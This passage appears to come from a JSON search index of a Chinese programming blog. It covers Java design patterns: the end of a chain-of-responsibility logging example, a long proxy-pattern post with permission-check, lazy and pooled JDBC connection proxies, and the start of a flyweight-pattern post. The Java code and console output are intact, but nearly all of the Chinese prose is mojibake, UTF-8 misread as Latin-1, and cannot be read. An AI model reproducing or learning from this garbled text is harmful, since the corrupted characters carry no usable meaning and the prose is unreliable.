loggerChain.logMessage(AbstractLogger.DEBUG, &quot;This is a debug level information.&quot;); loggerChain.logMessage(AbstractLogger.ERROR, &quot;This is an error information.&quot;); } } æ­¥éª¤ 4æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š Standard Console::Logger: This is an information. File::Logger: This is a debug level information. Standard Console::Logger: This is a debug level information. Error Console::Logger: This is an error information. File::Logger: This is an error information. Standard Console::Logger: This is an error information.","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"RESUME","slug":"RESUME","date":"2020-06-10T17:48:15.000Z","updated":"2021-04-15T15:45:55.334Z","comments":true,"path":"RESUME/","link":"","permalink":"https://blog.kayleh.top/RESUME/","excerpt":"RESUME","text":"RESUME img","categories":[],"tags":[{"name":"resume","slug":"resume","permalink":"https://blog.kayleh.top/tags/resume/"}]},{"title":"ä»£ç†æ¨¡å¼","slug":"ä»£ç†æ¨¡å¼","date":"2020-06-09T04:46:15.000Z","updated":"2021-04-11T17:11:28.604Z","comments":true,"path":"ä»£ç†æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/","excerpt":"ä»£ç†æ¨¡å¼ ä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ã€‚","text":"ä»£ç†æ¨¡å¼ ä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ã€‚ åœ¨ä»£ç†æ¨¡å¼ï¼ˆProxy Patternï¼‰ä¸­ï¼Œä¸€ä¸ªç±»ä»£è¡¨å¦ä¸€ä¸ªç±»çš„åŠŸèƒ½ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ã€‚ åœ¨ä»£ç†æ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºå…·æœ‰ç°æœ‰å¯¹è±¡çš„å¯¹è±¡ï¼Œä»¥ä¾¿å‘å¤–ç•Œæä¾›åŠŸèƒ½æ¥å£ã€‚ ä»‹ç»æ„å›¾ï¼šä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ã€‚ ä¸»è¦è§£å†³ï¼šåœ¨ç›´æ¥è®¿é—®å¯¹è±¡æ—¶å¸¦æ¥çš„é—®é¢˜ï¼Œæ¯”å¦‚è¯´ï¼šè¦è®¿é—®çš„å¯¹è±¡åœ¨è¿œç¨‹çš„æœºå™¨ä¸Šã€‚åœ¨é¢å‘å¯¹è±¡ç³»ç»Ÿä¸­ï¼Œæœ‰äº›å¯¹è±¡ç”±äºæŸäº›åŸå› ï¼ˆæ¯”å¦‚å¯¹è±¡åˆ›å»ºå¼€é”€å¾ˆå¤§ï¼Œæˆ–è€…æŸäº›æ“ä½œéœ€è¦å®‰å…¨æ§åˆ¶ï¼Œæˆ–è€…éœ€è¦è¿›ç¨‹å¤–çš„è®¿é—®ï¼‰ï¼Œç›´æ¥è®¿é—®ä¼šç»™ä½¿ç”¨è€…æˆ–è€…ç³»ç»Ÿç»“æ„å¸¦æ¥å¾ˆå¤šéº»çƒ¦ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è®¿é—®æ­¤å¯¹è±¡æ—¶åŠ ä¸Šä¸€ä¸ªå¯¹æ­¤å¯¹è±¡çš„è®¿é—®å±‚ã€‚ ä½•æ—¶ä½¿ç”¨ï¼šæƒ³åœ¨è®¿é—®ä¸€ä¸ªç±»æ—¶åšä¸€äº›æ§åˆ¶ã€‚ å¦‚ä½•è§£å†³ï¼šå¢åŠ ä¸­é—´å±‚ã€‚ å…³é”®ä»£ç ï¼šå®ç°ä¸è¢«ä»£ç†ç±»ç»„åˆã€‚ åº”ç”¨å®ä¾‹ï¼š 1ã€Windows é‡Œé¢çš„å¿«æ·æ–¹å¼ã€‚ 2ã€çŒªå…«æˆ’å»æ‰¾é«˜ç¿ å…°ç»“æœæ˜¯å­™æ‚Ÿç©ºå˜çš„ï¼Œå¯ä»¥è¿™æ ·ç†è§£ï¼šæŠŠé«˜ç¿ å…°çš„å¤–è²ŒæŠ½è±¡å‡ºæ¥ï¼Œé«˜ç¿ å…°æœ¬äººå’Œå­™æ‚Ÿç©ºéƒ½å®ç°äº†è¿™ä¸ªæ¥å£ï¼ŒçŒªå…«æˆ’è®¿é—®é«˜ç¿ å…°çš„æ—¶å€™çœ‹ä¸å‡ºæ¥è¿™ä¸ªæ˜¯å­™æ‚Ÿç©ºï¼Œæ‰€ä»¥è¯´å­™æ‚Ÿç©ºæ˜¯é«˜ç¿ å…°ä»£ç†ç±»ã€‚ 3ã€ä¹°ç«è½¦ç¥¨ä¸ä¸€å®šåœ¨ç«è½¦ç«™ä¹°ï¼Œä¹Ÿå¯ä»¥å»ä»£å”®ç‚¹ã€‚ 4ã€ä¸€å¼ æ”¯ç¥¨æˆ–é“¶è¡Œå­˜å•æ˜¯è´¦æˆ·ä¸­èµ„é‡‘çš„ä»£ç†ã€‚æ”¯ç¥¨åœ¨å¸‚åœºäº¤æ˜“ä¸­ç”¨æ¥ä»£æ›¿ç°é‡‘ï¼Œå¹¶æä¾›å¯¹ç­¾å‘äººè´¦å·ä¸Šèµ„é‡‘çš„æ§åˆ¶ã€‚ 5ã€spring aopã€‚ ä¼˜ç‚¹ï¼š 1ã€èŒè´£æ¸…æ™°ã€‚ 2ã€é«˜æ‰©å±•æ€§ã€‚ 3ã€æ™ºèƒ½åŒ–ã€‚ ç¼ºç‚¹ï¼š 1ã€ç”±äºåœ¨å®¢æˆ·ç«¯å’ŒçœŸå®ä¸»é¢˜ä¹‹é—´å¢åŠ äº†ä»£ç†å¯¹è±¡ï¼Œå› æ­¤æœ‰äº›ç±»å‹çš„ä»£ç†æ¨¡å¼å¯èƒ½ä¼šé€ æˆè¯·æ±‚çš„å¤„ç†é€Ÿåº¦å˜æ…¢ã€‚ 2ã€å®ç°ä»£ç†æ¨¡å¼éœ€è¦é¢å¤–çš„å·¥ä½œï¼Œæœ‰äº›ä»£ç†æ¨¡å¼çš„å®ç°éå¸¸å¤æ‚ã€‚ ä½¿ç”¨åœºæ™¯ï¼šæŒ‰èŒè´£æ¥åˆ’åˆ†ï¼Œé€šå¸¸æœ‰ä»¥ä¸‹ä½¿ç”¨åœºæ™¯ï¼š 1ã€è¿œç¨‹ä»£ç†ã€‚ 2ã€è™šæ‹Ÿä»£ç†ã€‚ 3ã€Copy-on-Write ä»£ç†ã€‚ 4ã€ä¿æŠ¤ï¼ˆProtect or Accessï¼‰ä»£ç†ã€‚ 5ã€Cacheä»£ç†ã€‚ 6ã€é˜²ç«å¢™ï¼ˆFirewallï¼‰ä»£ç†ã€‚ 7ã€åŒæ­¥åŒ–ï¼ˆSynchronizationï¼‰ä»£ç†ã€‚ 8ã€æ™ºèƒ½å¼•ç”¨ï¼ˆSmart Referenceï¼‰ä»£ç†ã€‚ æ³¨æ„äº‹é¡¹ï¼š 1ã€å’Œé€‚é…å™¨æ¨¡å¼çš„åŒºåˆ«ï¼šé€‚é…å™¨æ¨¡å¼ä¸»è¦æ”¹å˜æ‰€è€ƒè™‘å¯¹è±¡çš„æ¥å£ï¼Œè€Œä»£ç†æ¨¡å¼ä¸èƒ½æ”¹å˜æ‰€ä»£ç†ç±»çš„æ¥å£ã€‚ 2ã€å’Œè£…é¥°å™¨æ¨¡å¼çš„åŒºåˆ«ï¼šè£…é¥°å™¨æ¨¡å¼ä¸ºäº†å¢å¼ºåŠŸèƒ½ï¼Œè€Œä»£ç†æ¨¡å¼æ˜¯ä¸ºäº†åŠ ä»¥æ§åˆ¶ã€‚ å®ç°æˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ª Image æ¥å£å’Œå®ç°äº† Image æ¥å£çš„å®ä½“ç±»ã€‚ProxyImage æ˜¯ä¸€ä¸ªä»£ç†ç±»ï¼Œå‡å°‘ RealImage å¯¹è±¡åŠ è½½çš„å†…å­˜å ç”¨ã€‚ ProxyPatternDemoï¼Œæˆ‘ä»¬çš„æ¼”ç¤ºç±»ä½¿ç”¨ ProxyImage æ¥è·å–è¦åŠ è½½çš„ Image å¯¹è±¡ï¼Œå¹¶æŒ‰ç…§éœ€æ±‚è¿›è¡Œæ˜¾ç¤ºã€‚ ä»£ç†æ¨¡å¼çš„ UML å›¾ ä»£ç†æ¨¡å¼ï¼Œå³Proxyï¼Œå®ƒå’ŒAdapteræ¨¡å¼å¾ˆç±»ä¼¼ã€‚æˆ‘ä»¬å…ˆå›é¡¾Adapteræ¨¡å¼ï¼Œå®ƒç”¨äºæŠŠAæ¥å£è½¬æ¢ä¸ºBæ¥å£ï¼š public BAdapter implements B { private A a; public BAdapter(A a) { this.a = a; } public void b() { a.a(); } } è€ŒProxyæ¨¡å¼ä¸æ˜¯æŠŠAæ¥å£è½¬æ¢æˆBæ¥å£ï¼Œå®ƒè¿˜æ˜¯è½¬æ¢æˆAæ¥å£ï¼š public AProxy implements A { private A a; public AProxy(A a) { this.a = a; } public void a() { this.a.a(); } } åˆç€Proxyå°±æ˜¯ä¸ºäº†ç»™Aæ¥å£å†åŒ…ä¸€å±‚ï¼Œè¿™ä¸æ˜¯è„±äº†è£¤å­æ”¾å±å—ï¼Ÿ å½“ç„¶ä¸æ˜¯ã€‚æˆ‘ä»¬è§‚å¯ŸProxyçš„å®ç°Aæ¥å£çš„æ–¹æ³•ï¼š public void a() { this.a.a(); } è¿™æ ·å†™å½“ç„¶æ²¡å•¥åµç”¨ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è°ƒç”¨a.a()çš„å‰åï¼ŒåŠ ä¸€äº›é¢å¤–çš„ä»£ç ï¼š public void a() { if (getCurrentUser().isRoot()) { this.a.a(); } else { throw new SecurityException(&quot;Forbidden&quot;); } } è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±å®ç°äº†æƒé™æ£€æŸ¥ï¼Œåªæœ‰ç¬¦åˆè¦æ±‚çš„ç”¨æˆ·ï¼Œæ‰ä¼šçœŸæ­£è°ƒç”¨ç›®æ ‡æ–¹æ³•ï¼Œå¦åˆ™ï¼Œä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚ æœ‰çš„ç«¥é‹ä¼šé—®ï¼Œä¸ºå•¥ä¸æŠŠæƒé™æ£€æŸ¥çš„åŠŸèƒ½ç›´æ¥å†™åˆ°ç›®æ ‡å®ä¾‹Açš„å†…éƒ¨ï¼Ÿ å› ä¸ºæˆ‘ä»¬ç¼–å†™ä»£ç çš„åŸåˆ™æœ‰ï¼š èŒè´£æ¸…æ™°ï¼šä¸€ä¸ªç±»åªè´Ÿè´£ä¸€ä»¶äº‹ï¼› æ˜“äºæµ‹è¯•ï¼šä¸€æ¬¡åªæµ‹ä¸€ä¸ªåŠŸèƒ½ã€‚ ç”¨Proxyå®ç°è¿™ä¸ªæƒé™æ£€æŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—æ›´æ¸…æ™°ã€æ›´ç®€æ´çš„ä»£ç ï¼š Aæ¥å£ï¼šåªå®šä¹‰æ¥å£ï¼› ABusinessç±»ï¼šåªå®ç°Aæ¥å£çš„ä¸šåŠ¡é€»è¾‘ï¼› APermissionProxyç±»ï¼šåªå®ç°Aæ¥å£çš„æƒé™æ£€æŸ¥ä»£ç†ã€‚ å¦‚æœæˆ‘ä»¬å¸Œæœ›ç¼–å†™å…¶ä»–ç±»å‹çš„ä»£ç†ï¼Œå¯ä»¥ç»§ç»­å¢åŠ ç±»ä¼¼ALogProxyï¼Œè€Œä¸å¿…å¯¹ç°æœ‰çš„Aæ¥å£ã€ABusinessç±»è¿›è¡Œä¿®æ”¹ã€‚ å®é™…ä¸Šæƒé™æ£€æŸ¥åªæ˜¯ä»£ç†æ¨¡å¼çš„ä¸€ç§åº”ç”¨ã€‚Proxyè¿˜å¹¿æ³›åº”ç”¨åœ¨ï¼š è¿œç¨‹ä»£ç†è¿œç¨‹ä»£ç†å³Remote Proxyï¼Œæœ¬åœ°çš„è°ƒç”¨è€…æŒæœ‰çš„æ¥å£å®é™…ä¸Šæ˜¯ä¸€ä¸ªä»£ç†ï¼Œè¿™ä¸ªä»£ç†è´Ÿè´£æŠŠå¯¹æ¥å£çš„æ–¹æ³•è®¿é—®è½¬æ¢æˆè¿œç¨‹è°ƒç”¨ï¼Œç„¶åè¿”å›ç»“æœã€‚Javaå†…ç½®çš„RMIæœºåˆ¶å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¿œç¨‹ä»£ç†æ¨¡å¼ã€‚ è™šä»£ç†è™šä»£ç†å³Virtual Proxyï¼Œå®ƒè®©è°ƒç”¨è€…å…ˆæŒæœ‰ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œä½†çœŸæ­£çš„å¯¹è±¡å°šæœªåˆ›å»ºã€‚å¦‚æœæ²¡æœ‰å¿…è¦ï¼Œè¿™ä¸ªçœŸæ­£çš„å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆ›å»ºçš„ï¼Œç›´åˆ°å®¢æˆ·ç«¯éœ€è¦çœŸçš„å¿…é¡»è°ƒç”¨æ—¶ï¼Œæ‰åˆ›å»ºçœŸæ­£çš„å¯¹è±¡ã€‚JDBCçš„è¿æ¥æ± è¿”å›çš„JDBCè¿æ¥ï¼ˆConnectionå¯¹è±¡ï¼‰å°±å¯ä»¥æ˜¯ä¸€ä¸ªè™šä»£ç†ï¼Œå³è·å–è¿æ¥æ—¶æ ¹æœ¬æ²¡æœ‰ä»»ä½•å®é™…çš„æ•°æ®åº“è¿æ¥ï¼Œç›´åˆ°ç¬¬ä¸€æ¬¡æ‰§è¡ŒJDBCæŸ¥è¯¢æˆ–æ›´æ–°æ“ä½œæ—¶ï¼Œæ‰çœŸæ­£åˆ›å»ºå®é™…çš„JDBCè¿æ¥ã€‚ ä¿æŠ¤ä»£ç†ä¿æŠ¤ä»£ç†å³Protection Proxyï¼Œå®ƒç”¨ä»£ç†å¯¹è±¡æ§åˆ¶å¯¹åŸå§‹å¯¹è±¡çš„è®¿é—®ï¼Œå¸¸ç”¨äºé‰´æƒã€‚ æ™ºèƒ½å¼•ç”¨æ™ºèƒ½å¼•ç”¨å³Smart Referenceï¼Œå®ƒä¹Ÿæ˜¯ä¸€ç§ä»£ç†å¯¹è±¡ï¼Œå¦‚æœæœ‰å¾ˆå¤šå®¢æˆ·ç«¯å¯¹å®ƒè¿›è¡Œè®¿é—®ï¼Œé€šè¿‡å†…éƒ¨çš„è®¡æ•°å™¨å¯ä»¥åœ¨å¤–éƒ¨è°ƒç”¨è€…éƒ½ä¸ä½¿ç”¨åè‡ªåŠ¨é‡Šæ”¾å®ƒã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å¦‚ä½•åº”ç”¨ä»£ç†æ¨¡å¼ç¼–å†™ä¸€ä¸ªJDBCè¿æ¥æ± ï¼ˆDataSourceï¼‰ã€‚æˆ‘ä»¬é¦–å…ˆæ¥ç¼–å†™ä¸€ä¸ªè™šä»£ç†ï¼Œå³å¦‚æœè°ƒç”¨è€…è·å–åˆ°Connectionåï¼Œå¹¶æ²¡æœ‰æ‰§è¡Œä»»ä½•SQLæ“ä½œï¼Œé‚£ä¹ˆè¿™ä¸ªConnection Proxyå®é™…ä¸Šå¹¶ä¸ä¼šçœŸæ­£æ‰“å¼€JDBCè¿æ¥ã€‚è°ƒç”¨è€…ä»£ç å¦‚ä¸‹ï¼š DataSource lazyDataSource = new LazyDataSource(jdbcUrl, jdbcUsername, jdbcPassword); System.out.println(&quot;get lazy connection...&quot;); try (Connection conn1 = lazyDataSource.getConnection()) { // å¹¶æ²¡æœ‰å®é™…æ‰“å¼€çœŸæ­£çš„Connection } System.out.println(&quot;get lazy connection...&quot;); try (Connection conn2 = lazyDataSource.getConnection()) { try (PreparedStatement ps = conn2.prepareStatement(&quot;SELECT * FROM students&quot;)) { // æ‰“å¼€äº†çœŸæ­£çš„Connection try (ResultSet rs = ps.executeQuery()) { while (rs.next()) { System.out.println(rs.getString(&quot;name&quot;)); } } } } ç°åœ¨æˆ‘ä»¬æ¥æ€è€ƒå¦‚ä½•å®ç°è¿™ä¸ªLazyConnectionProxyã€‚ä¸ºäº†ç®€åŒ–ä»£ç ï¼Œæˆ‘ä»¬é¦–å…ˆé’ˆå¯¹Connectionæ¥å£åšä¸€ä¸ªæŠ½è±¡çš„ä»£ç†ç±»ï¼š public abstract class AbstractConnectionProxy implements Connection { // æŠ½è±¡æ–¹æ³•è·å–å®é™…çš„Connection: protected abstract Connection getRealConnection(); // å®ç°Connectionæ¥å£çš„æ¯ä¸€ä¸ªæ–¹æ³•: public Statement createStatement() throws SQLException { return getRealConnection().createStatement(); } public PreparedStatement prepareStatement(String sql) throws SQLException { return getRealConnection().prepareStatement(sql); } ...å…¶ä»–ä»£ç†æ–¹æ³•... } è¿™ä¸ªAbstractConnectionProxyä»£ç†ç±»çš„ä½œç”¨æ˜¯æŠŠConnectionæ¥å£å®šä¹‰çš„æ–¹æ³•å…¨éƒ¨å®ç°ä¸€éï¼Œå› ä¸ºConnectionæ¥å£å®šä¹‰çš„æ–¹æ³•å¤ªå¤šäº†ï¼Œåé¢æˆ‘ä»¬è¦ç¼–å†™çš„LazyConnectionProxyåªéœ€è¦ç»§æ‰¿AbstractConnectionProxyï¼Œå°±ä¸å¿…å†æŠŠConnectionæ¥å£æ–¹æ³•æŒ¨ä¸ªå®ç°ä¸€éã€‚ LazyConnectionProxyå®ç°å¦‚ä¸‹ï¼š public class LazyConnectionProxy extends AbstractConnectionProxy { private Supplier&lt;Connection&gt; supplier; private Connection target = null; public LazyConnectionProxy(Supplier&lt;Connection&gt; supplier) { this.supplier = supplier; } // è¦†å†™closeæ–¹æ³•ï¼šåªæœ‰targetä¸ä¸ºnullæ—¶æ‰éœ€è¦å…³é—­: public void close() throws SQLException { if (target != null) { System.out.println(&quot;Close connection: &quot; + target); super.close(); } } @Override protected Connection getRealConnection() { if (target == null) { target = supplier.get(); } return target; } } å¦‚æœè°ƒç”¨è€…æ²¡æœ‰æ‰§è¡Œä»»ä½•SQLè¯­å¥ï¼Œé‚£ä¹ˆtargetå­—æ®µå§‹ç»ˆä¸ºnullã€‚åªæœ‰ç¬¬ä¸€æ¬¡æ‰§è¡ŒSQLè¯­å¥æ—¶ï¼ˆå³è°ƒç”¨ä»»ä½•ç±»ä¼¼prepareStatement()æ–¹æ³•æ—¶ï¼Œè§¦å‘getRealConnection()è°ƒç”¨ï¼‰ï¼Œæ‰ä¼šçœŸæ­£æ‰“å¼€å®é™…çš„JDBC Connectionã€‚ æœ€åï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç¼–å†™ä¸€ä¸ªLazyDataSourceæ¥æ”¯æŒè¿™ä¸ªLazyConnecitonProxyï¼š public class LazyDataSource implements DataSource { private String url; private String username; private String password; public LazyDataSource(String url, String username, String password) { this.url = url; this.username = username; this.password = password; } public Connection getConnection(String username, String password) throws SQLException { return new LazyConnectionProxy(() -&gt; { try { Connection conn = DriverManager.getConnection(url, username, password); System.out.println(&quot;Open connection: &quot; + conn); return conn; } catch (SQLException e) { throw new RuntimeException(e); } }); } ... } æˆ‘ä»¬æ‰§è¡Œä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š get lazy connection... get lazy connection... Open connection: com.mysql.jdbc.JDBC4Connection@7a36aefa å°æ˜ å°çº¢ å°å†› å°ç™½ ... Close connection: com.mysql.jdbc.JDBC4Connection@7a36aefa å¯è§ç¬¬ä¸€ä¸ªgetConnection()è°ƒç”¨è·å–åˆ°çš„LazyConnectionProxyå¹¶æ²¡æœ‰å®é™…æ‰“å¼€çœŸæ­£çš„JDBC Connectionã€‚ ä½¿ç”¨è¿æ¥æ± çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ›´å¸Œæœ›èƒ½é‡å¤ä½¿ç”¨è¿æ¥ã€‚å¦‚æœè°ƒç”¨æ–¹ç¼–å†™è¿™æ ·çš„ä»£ç ï¼š DataSource pooledDataSource = new PooledDataSource(jdbcUrl, jdbcUsername, jdbcPassword); try (Connection conn = pooledDataSource.getConnection()) { } try (Connection conn = pooledDataSource.getConnection()) { // è·å–åˆ°çš„æ˜¯åŒä¸€ä¸ªConnection } try (Connection conn = pooledDataSource.getConnection()) { // è·å–åˆ°çš„æ˜¯åŒä¸€ä¸ªConnection } è°ƒç”¨æ–¹å¹¶ä¸å…³å¿ƒæ˜¯å¦å¤ç”¨äº†Connectionï¼Œä½†ä»PooledDataSourceè·å–çš„Connectionç¡®å®è‡ªå¸¦è¿™ä¸ªä¼˜åŒ–åŠŸèƒ½ã€‚å¦‚ä½•å®ç°å¯å¤ç”¨Connectionçš„è¿æ¥æ± ï¼Ÿç­”æ¡ˆä»ç„¶æ˜¯ä½¿ç”¨ä»£ç†æ¨¡å¼ã€‚ public class PooledConnectionProxy extends AbstractConnectionProxy { // å®é™…çš„Connection: Connection target; // ç©ºé—²é˜Ÿåˆ—: Queue&lt;PooledConnectionProxy&gt; idleQueue; public PooledConnectionProxy(Queue&lt;PooledConnectionProxy&gt; idleQueue, Connection target) { this.idleQueue = idleQueue; this.target = target; } public void close() throws SQLException { System.out.println(&quot;Fake close and released to idle queue for future reuse: &quot; + target); // å¹¶æ²¡æœ‰è°ƒç”¨å®é™…Connectionçš„close()æ–¹æ³•, // è€Œæ˜¯æŠŠè‡ªå·±æ”¾å…¥ç©ºé—²é˜Ÿåˆ—: idleQueue.offer(this); } protected Connection getRealConnection() { return target; } } å¤ç”¨è¿æ¥çš„å…³é”®åœ¨äºè¦†å†™close()æ–¹æ³•ï¼Œå®ƒå¹¶æ²¡æœ‰çœŸæ­£å…³é—­åº•å±‚JDBCè¿æ¥ï¼Œè€Œæ˜¯æŠŠè‡ªå·±æ”¾å›ä¸€ä¸ªç©ºé—²é˜Ÿåˆ—ï¼Œä»¥ä¾¿ä¸‹æ¬¡ä½¿ç”¨ã€‚ ç©ºé—²é˜Ÿåˆ—ç”±PooledDataSourceè´Ÿè´£ç»´æŠ¤ï¼š public class PooledDataSource implements DataSource { private String url; private String username; private String password; // ç»´æŠ¤ä¸€ä¸ªç©ºé—²é˜Ÿåˆ—: private Queue&lt;PooledConnectionProxy&gt; idleQueue = new ArrayBlockingQueue&lt;&gt;(100); public PooledDataSource(String url, String username, String password) { this.url = url; this.username = username; this.password = password; } public Connection getConnection(String username, String password) throws SQLException { // é¦–å…ˆè¯•å›¾è·å–ä¸€ä¸ªç©ºé—²è¿æ¥: PooledConnectionProxy conn = idleQueue.poll(); if (conn == null) { // æ²¡æœ‰ç©ºé—²è¿æ¥æ—¶ï¼Œæ‰“å¼€ä¸€ä¸ªæ–°è¿æ¥: conn = openNewConnection(); } else { System.out.println(&quot;Return pooled connection: &quot; + conn.target); } return conn; } private PooledConnectionProxy openNewConnection() throws SQLException { Connection conn = DriverManager.getConnection(url, username, password); System.out.println(&quot;Open new connection: &quot; + conn); return new PooledConnectionProxy(idleQueue, conn); } ... } æˆ‘ä»¬æ‰§è¡Œè°ƒç”¨æ–¹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š Open new connection: com.mysql.jdbc.JDBC4Connection@61ca2dfa Fake close and released to idle queue for future reuse: com.mysql.jdbc.JDBC4Connection@61ca2dfa Return pooled connection: com.mysql.jdbc.JDBC4Connection@61ca2dfa Fake close and released to idle queue for future reuse: com.mysql.jdbc.JDBC4Connection@61ca2dfa Return pooled connection: com.mysql.jdbc.JDBC4Connection@61ca2dfa Fake close and released to idle queue for future reuse: com.mysql.jdbc.JDBC4Connection@61ca2dfa é™¤äº†ç¬¬ä¸€æ¬¡æ‰“å¼€äº†ä¸€ä¸ªçœŸæ­£çš„JDBC Connectionï¼Œåç»­è·å–çš„Connectionå®é™…ä¸Šæ˜¯åŒä¸€ä¸ªJDBC Connectionã€‚ä½†æ˜¯ï¼Œå¯¹äºè°ƒç”¨æ–¹æ¥è¯´ï¼Œå®Œå…¨ä¸éœ€è¦çŸ¥é“åº•å±‚åšäº†å“ªäº›ä¼˜åŒ–ã€‚ æˆ‘ä»¬å®é™…ä½¿ç”¨çš„DataSourceï¼Œä¾‹å¦‚HikariCPï¼Œéƒ½æ˜¯åŸºäºä»£ç†æ¨¡å¼å®ç°çš„ï¼ŒåŸç†åŒä¸Šï¼Œä½†å¢åŠ äº†æ›´å¤šçš„å¦‚åŠ¨æ€ä¼¸ç¼©çš„åŠŸèƒ½ï¼ˆä¸€ä¸ªè¿æ¥ç©ºé—²ä¸€æ®µæ—¶é—´åè‡ªåŠ¨å…³é—­ï¼‰ã€‚ æœ‰çš„ç«¥é‹ä¼šå‘ç°Proxyæ¨¡å¼å’ŒDecoratoræ¨¡å¼æœ‰äº›ç±»ä¼¼ã€‚ç¡®å®ï¼Œè¿™ä¸¤è€…çœ‹èµ·æ¥å¾ˆåƒï¼Œä½†åŒºåˆ«åœ¨äºï¼šDecoratoræ¨¡å¼è®©è°ƒç”¨è€…è‡ªå·±åˆ›å»ºæ ¸å¿ƒç±»ï¼Œç„¶åç»„åˆå„ç§åŠŸèƒ½ï¼Œè€ŒProxyæ¨¡å¼å†³ä¸èƒ½è®©è°ƒç”¨è€…è‡ªå·±åˆ›å»ºå†ç»„åˆï¼Œå¦åˆ™å°±å¤±å»äº†ä»£ç†çš„åŠŸèƒ½ã€‚Proxyæ¨¡å¼è®©è°ƒç”¨è€…è®¤ä¸ºè·å–åˆ°çš„æ˜¯æ ¸å¿ƒç±»æ¥å£ï¼Œä½†å®é™…ä¸Šæ˜¯ä»£ç†ç±»ã€‚","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"äº«å…ƒæ¨¡å¼","slug":"äº«å…ƒæ¨¡å¼","date":"2020-06-09T02:05:02.000Z","updated":"2021-04-11T17:11:28.586Z","comments":true,"path":"äº«å…ƒæ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/","excerpt":"äº«å…ƒ è¿ç”¨å…±äº«æŠ€æœ¯æœ‰æ•ˆåœ°æ”¯æŒå¤§é‡ç»†ç²’åº¦çš„å¯¹è±¡ã€‚","text":"äº«å…ƒ è¿ç”¨å…±äº«æŠ€æœ¯æœ‰æ•ˆåœ°æ”¯æŒå¤§é‡ç»†ç²’åº¦çš„å¯¹è±¡ã€‚ äº«å…ƒï¼ˆFlyweightï¼‰çš„æ ¸å¿ƒæ€æƒ³å¾ˆç®€å•ï¼šå¦‚æœä¸€ä¸ªå¯¹è±¡å®ä¾‹ä¸€ç»åˆ›å»ºå°±ä¸å¯å˜ï¼Œé‚£ä¹ˆåå¤åˆ›å»ºç›¸åŒçš„å®ä¾‹å°±æ²¡æœ‰å¿…è¦ï¼Œç›´æ¥å‘è°ƒç”¨æ–¹è¿”å›ä¸€ä¸ªå…±äº«çš„å®ä¾‹å°±è¡Œï¼Œè¿™æ ·å³èŠ‚çœå†…å­˜ï¼Œåˆå¯ä»¥å‡å°‘åˆ›å»ºå¯¹è±¡çš„è¿‡ç¨‹ï¼Œæé«˜è¿è¡Œé€Ÿåº¦ã€‚ äº«å…ƒæ¨¡å¼åœ¨Javaæ ‡å‡†åº“ä¸­æœ‰å¾ˆå¤šåº”ç”¨ã€‚æˆ‘ä»¬çŸ¥é“ï¼ŒåŒ…è£…ç±»å‹å¦‚Byteã€Integeréƒ½æ˜¯ä¸å˜ç±»ï¼Œå› æ­¤ï¼Œåå¤åˆ›å»ºåŒä¸€ä¸ªå€¼ç›¸åŒçš„åŒ…è£…ç±»å‹æ˜¯æ²¡æœ‰å¿…è¦çš„ã€‚ä»¥Integerä¸ºä¾‹ï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡Integer.valueOf()è¿™ä¸ªé™æ€å·¥å‚æ–¹æ³•åˆ›å»ºIntegerå®ä¾‹ï¼Œå½“ä¼ å…¥çš„intèŒƒå›´åœ¨-128~+127ä¹‹é—´æ—¶ï¼Œä¼šç›´æ¥è¿”å›ç¼“å­˜çš„Integerå®ä¾‹ï¼š public class Main { public static void main(String[] args) throws InterruptedException { Integer n1 = Integer.valueOf(100); Integer n2 = Integer.valueOf(100); System.out.println(n1 == n2); // true } } å¯¹äºByteæ¥è¯´ï¼Œå› ä¸ºå®ƒä¸€å…±åªæœ‰256ä¸ªçŠ¶æ€ï¼Œæ‰€ä»¥ï¼Œé€šè¿‡Byte.valueOf()åˆ›å»ºçš„Byteå®ä¾‹ï¼Œå…¨éƒ¨éƒ½æ˜¯ç¼“å­˜å¯¹è±¡ã€‚ å› 